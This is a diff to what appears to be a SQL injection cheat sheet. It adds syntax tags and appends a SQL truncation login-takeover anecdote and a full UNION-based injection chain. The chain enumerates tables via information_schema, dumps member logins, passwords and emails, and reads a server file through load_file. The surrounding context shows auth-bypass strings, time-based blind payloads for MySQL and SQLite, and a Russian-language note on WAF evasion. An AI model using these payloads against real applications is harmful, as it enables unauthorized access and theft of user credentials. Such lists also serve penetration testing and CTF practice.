@@ -33,7 +33,7 @@ from table_name—>
 ```
 
 # auth bypass
-```
+```sql
 '-'
 ' '
 '&'
@@ -150,7 +150,7 @@ admin' or '1'='2
 Например, добавив управляющие символы (https://x.com/oualilweb/status/1754245617470066755) , типа %00, %0A и др. или вставив математические операции ('AND'1'=1*1 вместо 'AND'1'='1') или добавив специфичные комментарии типа /*!50000%55nIoN*/ /*!50000%53eLeCt*/ и многое другое.
 ```
 
-```
+```sql
 MySQL (string concat and logical ops)
 1' + sleep(10)
 1' and sleep(10)
@@ -170,4 +170,19 @@ Oracle
 SQLite
 1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+```
+
+SQL Truncation
+```
+As we see, we got a 200 response as the account was created, and I was able to log in as ‘r3dbuck3t@bucket.com’’. Though I signed up as ‘r3buck3t@bucket.com+++++hacker’’.
+```
+order by
+```sql
+id=1 AND 1=2 ORDER BY 5-- -
+id=1 AND 1=2 UNION ALL SELECT 1,2,3,4-- -  
+id=1 AND 1=2 UNION ALL SELECT 1,version(),null,database()-- - 
+id=1 AND 1=2 UNION ALL SELECT null,group_concat(table_name),null,version() from information_schema.tables where table_schema=database()-- - 
+id=1 AND 1=2 UNION ALL SELECT null,group_concat(column_name),null,version() from information_schema.columns where table_name=0x6d656d626572-- -  convert member to hex
+id=1 AND 1=2 UNION ALL SELECT null,concat_ws(0x3a,member_id,member_login,member_password,member_email),null,version() from member-- - 
+id=1 AND 1=2 UNION ALL SELECT 1,2,3,load_file(0x2F6368616C6C656E67652F7765622D736572766575722F636833312F696E6465782E706870)--
 ```
